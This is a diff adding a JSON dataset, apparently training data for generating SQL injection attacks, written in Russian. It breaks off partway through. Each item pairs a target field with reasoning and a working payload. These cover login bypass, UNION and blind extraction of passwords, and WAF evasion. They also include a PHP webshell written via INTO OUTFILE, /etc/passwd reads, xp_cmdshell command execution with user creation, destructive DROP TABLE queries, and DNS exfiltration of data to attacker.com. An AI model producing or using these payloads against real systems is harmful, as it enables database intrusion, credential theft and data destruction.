@@ -1,0 +1,4848 @@
+[
+{
+    "id": "sqli_gen_001",
+    "task": "Сгенерировать SQL-инъекцию для обхода аутентификации",
+    "input": {
+        "field": "email",
+        "field_type": "string",
+        "context": "login_form",
+        "backend": "unknown",
+        "quotes": "single"
+    },
+    "reasoning": "1. Поле email обычно в WHERE clause. 2. Нужно закрыть кавычку. 3. Добавить OR 1=1 для истинности. 4. Закомментировать остаток запроса.",
+    "payload": "admin' or 1=1 --",
+    "payload_explained": {
+        "admin": "целевое имя пользователя",
+        "'": "закрывает строку",
+        "or 1=1": "всегда истинно",
+        "--": "комментарий обрезает пароль"
+    },
+    "expected_behavior": "WHERE email='admin' or 1=1 --' AND password='...' станет истинным",
+    "confidence": 0.95,
+    "variants": [
+        "admin' or 1=1#",
+        "admin' or '1'='1",
+        "admin'--"
+    ]
+},
+{
+    "id": "sqli_gen_002",
+    "task": "Сгенерировать SQL-инъекцию для UNION атаки",
+    "input": {
+        "field": "search",
+        "field_type": "string",
+        "context": "search_form",
+        "error_message": "You have an error in your SQL syntax",
+        "columns_detected": 5
+    },
+    "reasoning": "1. Ошибка синтаксиса = уязвимость. 2. 5 колонок найдено через ORDER BY. 3. UNION SELECT должен иметь 5 полей. 4. Первые 3 null, последние 2 для данных.",
+    "payload": "' UNION SELECT null,null,null,username,password FROM users--",
+    "payload_explained": {
+        "'": "закрывает строку",
+        "UNION SELECT": "объединяет результаты",
+        "null,null,null": "заполнение колонок 1-3",
+        "username,password": "целевые данные колонки 4-5",
+        "FROM users": "таблица пользователей",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Вывод имён и паролей в результатах поиска",
+    "confidence": 0.90,
+    "variants": [
+        "' UNION SELECT 1,2,3,username,password FROM users--",
+        "' UNION SELECT null,null,null,table_name,null FROM information_schema.tables--"
+    ]
+},
+{
+    "id": "sqli_gen_003",
+    "task": "Сгенерировать SQL-инъекцию для time-based blind",
+    "input": {
+        "field": "id",
+        "field_type": "integer",
+        "context": "url_parameter",
+        "backend": "mysql",
+        "filter": "quotes_blocked"
+    },
+    "reasoning": "1. Кавычки заблокированы. 2. Integer поле = кавычки не нужны. 3. MySQL = используем SLEEP(). 4. Blind = проверяем по времени.",
+    "payload": "1 AND SLEEP(5)",
+    "payload_explained": {
+        "1": "оригинальное значение",
+        "AND": "логическое И",
+        "SLEEP(5)": "задержка 5 секунд"
+    },
+    "expected_behavior": "Ответ придёт через 5+ секунд если уязвимо",
+    "confidence": 0.85,
+    "variants": [
+        "1 AND BENCHMARK(10000000,SHA1('test'))",
+        "1; WAITFOR DELAY '0:0:5'--"
+    ]
+},
+{
+    "id": "sqli_gen_004",
+    "task": "Сгенерировать SQL-инъекцию для PostgreSQL",
+    "input": {
+        "field": "username",
+        "field_type": "string",
+        "context": "api_json",
+        "backend": "postgresql",
+        "quotes": "single"
+    },
+    "reasoning": "1. PostgreSQL синтаксис. 2. JSON контекст = двойные кавычки в payload. 3. Используем pg_sleep для time-based.",
+    "payload": "admin' AND pg_sleep(5)--",
+    "payload_explained": {
+        "admin'": "закрывает строку",
+        "AND pg_sleep(5)": "PostgreSQL задержка",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Задержка ответа 5 секунд",
+    "confidence": 0.88,
+    "variants": [
+        "admin'; SELECT pg_sleep(5)--",
+        "admin' AND 1=(SELECT 1 FROM pg_sleep(5))--"
+    ]
+},
+{
+    "id": "sqli_gen_005",
+    "task": "Сгенерировать SQL-инъекцию для MSSQL",
+    "input": {
+        "field": "email",
+        "field_type": "string",
+        "context": "login_form",
+        "backend": "mssql",
+        "quotes": "single"
+    },
+    "reasoning": "1. MSSQL синтаксис. 2. WAITFOR DELAY для задержки. 3. Формат времени '0:0:seconds'.",
+    "payload": "admin'; WAITFOR DELAY '0:0:5'--",
+    "payload_explained": {
+        "admin'": "закрывает строку",
+        ";": "конец предыдущего запроса",
+        "WAITFOR DELAY": "MSSQL задержка",
+        "'0:0:5'": "5 секунд",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Задержка 5 секунд перед ответом",
+    "confidence": 0.90,
+    "variants": [
+        "admin' AND WAITFOR DELAY '0:0:5'--",
+        "admin'; IF(1=1) WAITFOR DELAY '0:0:5'--"
+    ]
+},
+{
+    "id": "sqli_gen_006",
+    "task": "Сгенерировать SQL-инъекцию для извлечения версии БД",
+    "input": {
+        "field": "search",
+        "field_type": "string",
+        "context": "search_form",
+        "backend": "mysql",
+        "attack_goal": "version_enumeration"
+    },
+    "reasoning": "1. Цель = версия БД. 2. MySQL = @@version. 3. UNION для вывода в видимое место.",
+    "payload": "' UNION SELECT @@version,null,null--",
+    "payload_explained": {
+        "'": "закрывает строку",
+        "UNION SELECT": "объединение",
+        "@@version": "переменная версии MySQL",
+        "null,null": "заполнение колонок",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Версия MySQL в результатах поиска",
+    "confidence": 0.92,
+    "variants": [
+        "' UNION SELECT version(),null,null--",
+        "' OR 1=1 UNION SELECT @@version--"
+    ]
+},
+{
+    "id": "sqli_gen_007",
+    "task": "Сгенерировать SQL-инъекцию для извлечения имён таблиц",
+    "input": {
+        "field": "id",
+        "field_type": "string",
+        "context": "url_parameter",
+        "backend": "mysql",
+        "attack_goal": "table_enumeration",
+        "columns": 3
+    },
+    "reasoning": "1. Цель = имена таблиц. 2. information_schema.tables. 3. column_name для имён. 4. 3 колонки найдено.",
+    "payload": "' UNION SELECT null,table_name,null FROM information_schema.tables--",
+    "payload_explained": {
+        "'": "закрывает строку",
+        "UNION SELECT": "объединение",
+        "null,table_name,null": "колонка 2 для имени",
+        "FROM information_schema.tables": "системная таблица",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Список таблиц в ответе",
+    "confidence": 0.89,
+    "variants": [
+        "' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables--"
+    ]
+},
+{
+    "id": "sqli_gen_008",
+    "task": "Сгенерировать SQL-инъекцию для извлечения имён колонок",
+    "input": {
+        "field": "search",
+        "field_type": "string",
+        "context": "search_form",
+        "backend": "mysql",
+        "attack_goal": "column_enumeration",
+        "target_table": "users"
+    },
+    "reasoning": "1. Цель = колонки таблицы users. 2. information_schema.columns. 3. WHERE для фильтрации по таблице.",
+    "payload": "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
+    "payload_explained": {
+        "'": "закрывает строку",
+        "column_name": "имя колонки",
+        "WHERE table_name='users'": "фильтр по таблице",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Список колонок таблицы users",
+    "confidence": 0.87,
+    "variants": [
+        "' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_name='users'--"
+    ]
+},
+{
+    "id": "sqli_gen_009",
+    "task": "Сгенерировать SQL-инъекцию для boolean-based blind",
+    "input": {
+        "field": "id",
+        "field_type": "integer",
+        "context": "url_parameter",
+        "backend": "mysql",
+        "attack_goal": "data_extraction",
+        "filter": "no_error_messages"
+    },
+    "reasoning": "1. Нет ошибок = blind. 2. Boolean = проверяем истинность. 3. SUBSTRING для посимвольного извлечения. 4. ASCII для сравнения.",
+    "payload": "1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>50",
+    "payload_explained": {
+        "1 AND": "условие",
+        "ASCII()": "код символа",
+        "SUBSTRING()": "извлечение части",
+        "SELECT password": "целевые данные",
+        "WHERE id=1": "конкретный пользователь",
+        ">50": "сравнение"
+    },
+    "expected_behavior": "Разный контент если ASCII>50 vs ASCII<50",
+    "confidence": 0.82,
+    "variants": [
+        "1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'",
+        "1 AND (SELECT password FROM users WHERE id=1) LIKE 'a%'"
+    ]
+},
+{
+    "id": "sqli_gen_010",
+    "task": "Сгенерировать SQL-инъекцию с обходом WAF",
+    "input": {
+        "field": "search",
+        "field_type": "string",
+        "context": "search_form",
+        "backend": "mysql",
+        "filter": "keywords_blocked:SELECT,UNION,DROP",
+        "filter_type": "case_insensitive"
+    },
+    "reasoning": "1. Ключевые слова заблокированы. 2. Используем альтернативный регистр. 3. Или двойное экранирование. 4. Или комментарии внутри слов.",
+    "payload": "' UN/**/ION SEL/**/ECT null,null,null--",
+    "payload_explained": {
+        "UN/**/ION": "UNION с комментарием внутри",
+        "SEL/**/ECT": "SELECT с комментарием",
+        "null,null,null": "заполнение колонок",
+        "--": "комментарий"
+    },
+    "expected_behavior": "WAF пропускает, БД выполняет",
+    "confidence": 0.75,
+    "variants": [
+        "' uNiOn SeLeCt null,null,null--",
+        "' UNION/**/SELECT null,null,null--",
+        "' UNION SELECT null,null,null FROM dual--"
+    ]
+},
+{
+    "id": "sqli_gen_011",
+    "task": "Сгенерировать SQL-инъекцию для JSON поля",
+    "input": {
+        "field": "email",
+        "field_type": "json",
+        "context": "api_post",
+        "backend": "mysql",
+        "content_type": "application/json"
+    },
+    "reasoning": "1. JSON контекст. 2. Закрываем кавычку в значении. 3. inject после двоеточия.",
+    "payload": "admin' or 1=1 --",
+    "payload_explained": {
+        "admin'": "закрывает строку JSON",
+        "or 1=1": "условие истинно",
+        "--": "комментарий"
+    },
+    "json_example": "{\"email\":\"admin' or 1=1 --\",\"password\":\"x\"}",
+    "expected_behavior": "Вход выполнен без валидного пароля",
+    "confidence": 0.91,
+    "variants": [
+        "admin' AND 1=1--",
+        "admin' or '1'='1"
+    ]
+},
+{
+    "id": "sqli_gen_012",
+    "task": "Сгенерировать SQL-инъекцию для cookie поля",
+    "input": {
+        "field": "session_id",
+        "field_type": "cookie",
+        "context": "http_cookie",
+        "backend": "mysql"
+    },
+    "reasoning": "1. Cookie часто используются в запросах. 2. SQLi через cookie возможен. 3. Закрываем строку.",
+    "payload": "session_id=admin' or 1=1 --",
+    "payload_explained": {
+        "session_id": "имя cookie",
+        "admin' or 1=1 --": "payload"
+    },
+    "expected_behavior": "Сессия подделана через SQLi",
+    "confidence": 0.70,
+    "variants": [
+        "session_id=' UNION SELECT null,null--"
+    ]
+},
+{
+    "id": "sqli_gen_013",
+    "task": "Сгенерировать SQL-инъекцию для HTTP заголовка",
+    "input": {
+        "field": "User-Agent",
+        "field_type": "header",
+        "context": "http_header",
+        "backend": "mysql"
+    },
+    "reasoning": "1. Заголовки могут логироваться в БД. 2. SQLi через User-Agent возможен. 3. Time-based для проверки.",
+    "payload": "Mozilla/5.0' AND SLEEP(5)--",
+    "payload_explained": {
+        "Mozilla/5.0'": "закрывает строку",
+        "AND SLEEP(5)": "задержка",
+        "--": "комментарий"
+    },
+    "expected_behavior": "Задержка ответа 5 секунд",
+    "confidence": 0.65,
+    "variants": [
+        "Mozilla/5.0'; WAITFOR DELAY '0:0:5'--",
+        "Mozilla/5.0' UNION SELECT null--"
+    ]
+},
+{
+    "id": "sqli_gen_014",
+    "task": "Сгенерировать SQL-инъекцию для second-order",
+    "input": {
+        "field": "username",
+        "field_type": "string",
+        "context": "registration",
+        "backend": "mysql",
+        "attack_goal": "stored_for_later"
+    },
+    "reasoning": "1. Second-order = payload сохраняется. 2. Выполняется позже при другом действии. 3. Сохраняем в registration.",
+    "payload": "admin'--",
+    "payload_explained": {
+        "admin'": "целевой пользователь",
+        "--": "комментарий обрезает пароль при будущем использовании"
+    },
+    "expected_behavior": "При логине admin пароль будет обрезан",
+    "confidence": 0.72,
+    "variants": [
+        "admin'#",
+        "admin'/*"
+    ]
+},
+{
+    "id": "sqli_gen_015",
+    "task": "Сгенерировать полиглот SQL-инъекцию",
+    "input": {
+        "field": "search",
+        "field_type": "string",
+        "context": "unknown",
+        "backend": "unknown",
+        "filter": "unknown"
+    },
+    "reasoning": "1. Контекст неизвестен. 2. Полиглот работает в множестве контекстов. 3. Тестируем универсально.",
+    "payload": "SLEEP(1)/*' or SLEEP(1) or \" or SLEEP(1) or \"*/",
+    "payload_explained": {
+        "SLEEP(1)": "MySQL задержка",
+        "/*'": "закрывает если в комментарии",
+        "or SLEEP(1)": "альтернатива",
+        "\\\"": "для двойных кавычек",
+        "*/": "закрывает комментарий"
+    },
+    "expected_behavior": "Задержка в любом контексте",
+    "confidence": 0.80,
+    "variants": [
+        "1' OR 1=1--/*",
+        "';EXEC xp_cmdshell('dir')--"
+    ]
+},
+
+    {
+        "id": "sqli_gen_016",
+        "task": "Сгенерировать SQL-инъекцию для Oracle",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "oracle",
+            "quotes": "single"
+        },
+        "reasoning": "1. Oracle синтаксис. 2. Двойные кавычки для строк. 3. Используем dbms_lock.sleep для задержки. 4. UNION требует SELECT из dual.",
+        "payload": "admin' OR 1=1--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "OR 1=1": "всегда истинно",
+            "--": "комментарий в Oracle"
+        },
+        "expected_behavior": "Обход аутентификации",
+        "confidence": 0.87,
+        "variants": [
+            "admin' UNION SELECT null FROM dual--",
+            "admin' AND 1=(SELECT COUNT(*) FROM all_tables)--"
+        ]
+    },
+    {
+        "id": "sqli_gen_017",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных через error-based",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "data_extraction_via_errors"
+        },
+        "reasoning": "1. Error-based = данные в ошибках. 2. Используем extractvalue или updatexml. 3. Конкатенация с целевыми данными.",
+        "payload": "1 AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e))",
+        "payload_explained": {
+            "1 AND": "условие",
+            "extractvalue()": "функция для XML",
+            "concat()": "объединение строк",
+            "0x7e": "тильда для маркера",
+            "SELECT password": "целевые данные"
+        },
+        "expected_behavior": "Ошибка с паролем в сообщении",
+        "confidence": 0.88,
+        "variants": [
+            "1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)",
+            "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1)"
+        ]
+    },
+    {
+        "id": "sqli_gen_018",
+        "task": "Сгенерировать SQL-инъекцию для stacked queries",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "support": "multi_query"
+        },
+        "reasoning": "1. Stacked queries = несколько запросов через ;. 2. Позволяет выполнить DML/DDL. 3. Вставка данных или изменение схемы.",
+        "payload": "1; INSERT INTO users (username,password) VALUES ('hacker','pwned')--",
+        "payload_explained": {
+            "1": "оригинальный запрос",
+            ";": "разделитель",
+            "INSERT INTO": "вставка данных",
+            "VALUES": "значения для вставки",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Создание нового пользователя в БД",
+        "confidence": 0.78,
+        "variants": [
+            "1; UPDATE users SET password='hacked' WHERE username='admin'--",
+            "1; DROP TABLE users--",
+            "1; DELETE FROM logs WHERE id=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_019",
+        "task": "Сгенерировать SQL-инъекцию для out-of-band",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mssql",
+            "attack_goal": "dns_exfiltration"
+        },
+        "reasoning": "1. Out-of-band = данные через DNS/HTTP. 2. MSSQL = xp_dirtree или fn_xe_file_target_read_file. 3. Конкатенация с DNS именем.",
+        "payload": "admin'; DECLARE @h varchar(100); SET @h = (SELECT TOP 1 name FROM sysobjects); EXEC('master..xp_dirtree \"\\\\' + @h + '.attacker.com\\test\"')--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "DECLARE": "объявление переменной",
+            "xp_dirtree": "хранимая процедура",
+            "UNC путь": "запрос к DNS",
+            "@h": "данные для эксфильтрации"
+        },
+        "expected_behavior": "DNS запрос к attacker.com с данными",
+        "confidence": 0.68,
+        "variants": [
+            "admin'; EXEC master..xp_cmdshell 'nslookup attacker.com'--",
+            "admin'; SELECT * FROM OPENROWSET('SQLOLEDB','';'attacker.com';'123', 'SELECT 1')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_020",
+        "task": "Сгенерировать SQL-инъекцию с обходом через кодирование",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "filter": "waf_blocking_special_chars",
+            "encoding": "url"
+        },
+        "reasoning": "1. WAF блокирует спецсимволы. 2. URL-кодирование обходит проверки. 3. Двойное кодирование для усиления.",
+        "payload": "%27%20UNION%20SELECT%20null%2C%40%40version%2Cnull--",
+        "payload_explained": {
+            "%27": "апостроф (')",
+            "%20": "пробел",
+            "%2C": "запятая",
+            "%40%40version": "@@version",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Выполнение после декодирования",
+        "confidence": 0.82,
+        "variants": [
+            "%2527%2520UNION%2520SELECT%2520null%252C%2540%2540version%252Cnull--",
+            "admin%2527%2520or%25201%253D1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_021",
+        "task": "Сгенерировать SQL-инъекцию для фильтрации через пробелы",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "filter": "spaces_blocked"
+        },
+        "reasoning": "1. Пробелы заблокированы. 2. Используем табуляцию, комментарии или альтернативные разделители. 3. %0a, %0d, /**/ для обхода.",
+        "payload": "admin'/**/or/**/1=1--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "/**/": "комментарий вместо пробела",
+            "or": "логическое ИЛИ",
+            "1=1": "всегда истинно",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход аутентификации без пробелов",
+        "confidence": 0.84,
+        "variants": [
+            "admin'%0aor%0a1=1--",
+            "admin'\tor\t1=1--",
+            "admin'%0dor%0d1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_022",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных через LIKE",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "attack_goal": "blind_data_extraction"
+        },
+        "reasoning": "1. Boolean blind через LIKE. 2. Поиск по шаблону. 3. Символ % для частичного совпадения.",
+        "payload": "' OR username LIKE 'a%' AND '1'='1",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "OR": "логическое ИЛИ",
+            "username LIKE 'a%'": "проверка на букву a",
+            "AND '1'='1": "завершение условия"
+        },
+        "expected_behavior": "Разные результаты если пользователи начинаются на a",
+        "confidence": 0.79,
+        "variants": [
+            "' OR username LIKE 'admin%'--",
+            "' AND password LIKE 'p%' AND '1'='1"
+        ]
+    },
+    {
+        "id": "sqli_gen_023",
+        "task": "Сгенерировать SQL-инъекцию для MySQL с использованием процедур",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "privileges": "high"
+        },
+        "reasoning": "1. Высокие привилегии. 2. Используем INTO OUTFILE для записи файла. 3. Webshell или экспорт данных.",
+        "payload": "1 UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE \"/var/www/html/shell.php\"--",
+        "payload_explained": {
+            "1": "оригинальное значение",
+            "UNION SELECT": "объединение",
+            "\"<?php ... ?>\"": "PHP webshell",
+            "INTO OUTFILE": "запись в файл",
+            "/var/www/html/shell.php": "целевой путь"
+        },
+        "expected_behavior": "Создание PHP файла на сервере",
+        "confidence": 0.62,
+        "variants": [
+            "1 INTO OUTFILE '/tmp/out.txt' FIELDS TERMINATED BY ','--",
+            "1 UNION SELECT load_file('/etc/passwd')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_024",
+        "task": "Сгенерировать SQL-инъекцию для PostgreSQL с чтением файлов",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "api_endpoint",
+            "backend": "postgresql",
+            "privileges": "superuser"
+        },
+        "reasoning": "1. PostgreSQL superuser = чтение файлов. 2. Используем pg_read_file или lo_import. 3. UNION для вывода.",
+        "payload": "' UNION SELECT pg_read_file('/etc/passwd',0,1000)--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "pg_read_file()": "функция чтения файлов",
+            "/etc/passwd": "целевой файл",
+            "0,1000": "смещение и длина"
+        },
+        "expected_behavior": "Содержимое /etc/passwd в ответе",
+        "confidence": 0.71,
+        "variants": [
+            "' UNION SELECT lo_import('/etc/passwd',12345)--",
+            "' AND 1=CAST(pg_read_file('/etc/passwd') AS int)--"
+        ]
+    },
+    {
+        "id": "sqli_gen_025",
+        "task": "Сгенерировать SQL-инъекцию для SQLite",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "sqlite",
+            "quotes": "single"
+        },
+        "reasoning": "1. SQLite синтаксис. 2. sqlite_master для метаданных. 3. GROUP_CONCAT для конкатенации.",
+        "payload": "' UNION SELECT sql FROM sqlite_master--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "sql": "поле со схемой",
+            "FROM sqlite_master": "системная таблица",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Схема БД в результатах",
+        "confidence": 0.86,
+        "variants": [
+            "' UNION SELECT tbl_name FROM sqlite_master--",
+            "' AND 1=(SELECT COUNT(*) FROM sqlite_master)--"
+        ]
+    },
+    {
+        "id": "sqli_gen_026",
+        "task": "Сгенерировать SQL-инъекцию для ORDER BY",
+        "input": {
+            "field": "sort",
+            "field_type": "string",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "query_part": "ORDER BY"
+        },
+        "reasoning": "1. Инъекция в ORDER BY. 2. Используем CASE или AND. 3. Boolean blind для извлечения данных.",
+        "payload": "(CASE WHEN (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)>50 THEN id ELSE name END)",
+        "payload_explained": {
+            "CASE WHEN": "условное выражение",
+            "SELECT ASCII()": "извлечение символа",
+            "THEN id": "сортировка по id если истина",
+            "ELSE name": "сортировка по name если ложь"
+        },
+        "expected_behavior": "Разный порядок сортировки в зависимости от данных",
+        "confidence": 0.76,
+        "variants": [
+            "id AND (SELECT 1 FROM users WHERE id=1 AND 1=1)",
+            "RAND(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)))"
+        ]
+    },
+    {
+        "id": "sqli_gen_027",
+        "task": "Сгенерировать SQL-инъекцию через INSERT",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "registration_form",
+            "backend": "mysql",
+            "query_type": "INSERT"
+        },
+        "reasoning": "1. Инъекция в INSERT запрос. 2. Закрываем скобки и добавляем значения. 3. Может создать пользователя с правами.",
+        "payload": "hacker', 'pwned', 1)--",
+        "payload_explained": {
+            "hacker'": "закрывает строку",
+            ", 'pwned', 1": "дополнительные значения",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Вставка пользователя с is_admin=1",
+        "confidence": 0.81,
+        "variants": [
+            "admin' AND SLEEP(5)--",
+            "user' OR (SELECT COUNT(*) FROM users)>0--"
+        ]
+    },
+    {
+        "id": "sqli_gen_028",
+        "task": "Сгенерировать SQL-инъекцию через UPDATE",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "profile_update",
+            "backend": "mysql",
+            "query_type": "UPDATE"
+        },
+        "reasoning": "1. Инъекция в UPDATE. 2. Изменение данных других пользователей. 3. Используем WHERE для расширения.",
+        "payload": "new@email.com' WHERE id=1 OR '1'='1",
+        "payload_explained": {
+            "new@email.com'": "закрывает строку",
+            "WHERE id=1": "целевой пользователь",
+            "OR '1'='1": "расширение на всех"
+        },
+        "expected_behavior": "Обновление всех email адресов",
+        "confidence": 0.80,
+        "variants": [
+            "test' WHERE username='admin'--",
+            "hacked' OR 1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_029",
+        "task": "Сгенерировать SQL-инъекцию для PostgreSQL с JSON операторами",
+        "input": {
+            "field": "data",
+            "field_type": "json",
+            "context": "api_graphql",
+            "backend": "postgresql",
+            "operators": "jsonb"
+        },
+        "reasoning": "1. PostgreSQL JSONB операторы. 2. Инъекция через jsonb_to_recordset. 3. Извлечение данных через JSON пути.",
+        "payload": "{\"key\":\"1' AND pg_sleep(5) AND '1'='1\"}",
+        "payload_explained": {
+            "{\"key\":": "JSON объект",
+            "1' AND pg_sleep(5)": "инъекция в значение",
+            "AND '1'='1\"": "закрытие строки"
+        },
+        "expected_behavior": "Задержка 5 секунд",
+        "confidence": 0.74,
+        "variants": [
+            "{\"query\":\"admin' OR '1'='1\"}",
+            "{\"filter\":\"{\\\"username\\\":\\\"admin'--\\\"}\"}"
+        ]
+    },
+    {
+        "id": "sqli_gen_030",
+        "task": "Сгенерировать SQL-инъекцию для обхода через комментарии",
+        "input": {
+            "field": "password",
+            "field_type": "string",
+            "context": "login_form",
+            "filter": "basic_waf",
+            "comment_style": "multiple"
+        },
+        "reasoning": "1. Вложенные комментарии для обхода. 2. /*! MySQL specific code */. 3. Условные комментарии.",
+        "payload": "admin'/*!50000 OR 1=1*/--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "/*!50000": "MySQL условный комментарий",
+            "OR 1=1": "условие",
+            "*/": "закрытие комментария",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Выполнение для MySQL 5.00+",
+        "confidence": 0.83,
+        "variants": [
+            "admin'/*!OR*/1=1--",
+            "admin'--!>",
+            "admin'/*!/*!OR*/1=1*/--"
+        ]
+    },
+    {
+        "id": "sqli_gen_031",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через регулярные выражения",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "attack_goal": "regex_injection"
+        },
+        "reasoning": "1. Используем REGEXP для boolean blind. 2. Поиск по шаблону. 3. Медленный но точный метод.",
+        "payload": "' OR username REGEXP '^[a-z]' AND '1'='1",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "OR": "логическое ИЛИ",
+            "REGEXP '^[a-z]'": "проверка первого символа",
+            "AND '1'='1": "завершение условия"
+        },
+        "expected_behavior": "Разные результаты для разных regex",
+        "confidence": 0.77,
+        "variants": [
+            "' AND password REGEXP '^a'--",
+            "' OR email REGEXP '.*@.*'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_032",
+        "task": "Сгенерировать SQL-инъекцию для MongoDB (NoSQL)",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mongodb",
+            "query_type": "nosql"
+        },
+        "reasoning": "1. NoSQL инъекция через операторы. 2. $ne, $gt, $regex. 3. Обход аутентификации через сравнение.",
+        "payload": "{\"$ne\": null}",
+        "payload_explained": {
+            "{\"$ne\": null}": "условие не равно null",
+            "в поле username": "всегда истинно"
+        },
+        "expected_behavior": "Обход аутентификации через оператор $ne",
+        "confidence": 0.85,
+        "variants": [
+            "{\"$regex\": \".*\"}",
+            "{\"$gt\": \"\"}",
+            "admin' || '1'=='1"
+        ]
+    },
+    {
+        "id": "sqli_gen_033",
+        "task": "Сгенерировать SQL-инъекцию для time-based с конкатенацией",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "attack_goal": "slow_extraction"
+        },
+        "reasoning": "1. Time-based через IF и SLEEP. 2. Конкатенация для множественных запросов. 3. Постепенное извлечение.",
+        "payload": "1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>50, SLEEP(5), 0)",
+        "payload_explained": {
+            "1 AND": "условие",
+            "IF()": "условная функция",
+            "ASCII(SUBSTRING())": "извлечение символа",
+            "SLEEP(5)": "задержка при истине",
+            "0": "нет задержки при лжи"
+        },
+        "expected_behavior": "Задержка 5 сек если символ > 50",
+        "confidence": 0.84,
+        "variants": [
+            "1 AND CASE WHEN (SELECT password FROM users WHERE id=1) LIKE 'a%' THEN SLEEP(5) ELSE 0 END",
+            "1 AND (SELECT IF(1=1, SLEEP(5), 0))"
+        ]
+    },
+    {
+        "id": "sqli_gen_034",
+        "task": "Сгенерировать SQL-инъекцию для извлечения через GROUP BY и HAVING",
+        "input": {
+            "field": "category",
+            "field_type": "string",
+            "context": "filter_form",
+            "backend": "mysql",
+            "query_part": "GROUP BY"
+        },
+        "reasoning": "1. Инъекция в GROUP BY или HAVING. 2. Используем для извлечения данных. 3. Error-based через GROUP_CONCAT.",
+        "payload": "' HAVING 1=1 GROUP BY CONCAT((SELECT password FROM users LIMIT 1),'\")",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "HAVING": "условие для групп",
+            "GROUP BY": "группировка",
+            "CONCAT()": "объединение с данными",
+            "SELECT password": "целевые данные"
+        },
+        "expected_behavior": "Ошибка с данными в сообщении",
+        "confidence": 0.73,
+        "variants": [
+            "' GROUP BY (SELECT password FROM users)--",
+            "' HAVING 1=1 AND (SELECT password FROM users)='x'"
+        ]
+    },
+    {
+        "id": "sqli_gen_035",
+        "task": "Сгенерировать SQL-инъекцию для MSSQL с xp_cmdshell",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mssql",
+            "privileges": "sysadmin"
+        },
+        "reasoning": "1. xp_cmdshell для выполнения команд ОС. 2. Включение если отключено. 3. Выполнение системных команд.",
+        "payload": "admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "sp_configure": "настройка конфигурации",
+            "RECONFIGURE": "применение настроек",
+            "xp_cmdshell": "выполнение команд",
+            "whoami": "команда ОС"
+        },
+        "expected_behavior": "Выполнение команды ОС",
+        "confidence": 0.65,
+        "variants": [
+            "admin'; EXEC xp_cmdshell 'ipconfig'--",
+            "admin'; EXEC master..xp_cmdshell 'net user hacker pass /add'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_036",
+        "task": "Сгенерировать SQL-инъекцию для MySQL с пользовательскими функциями",
+        "input": {
+            "field": "id",
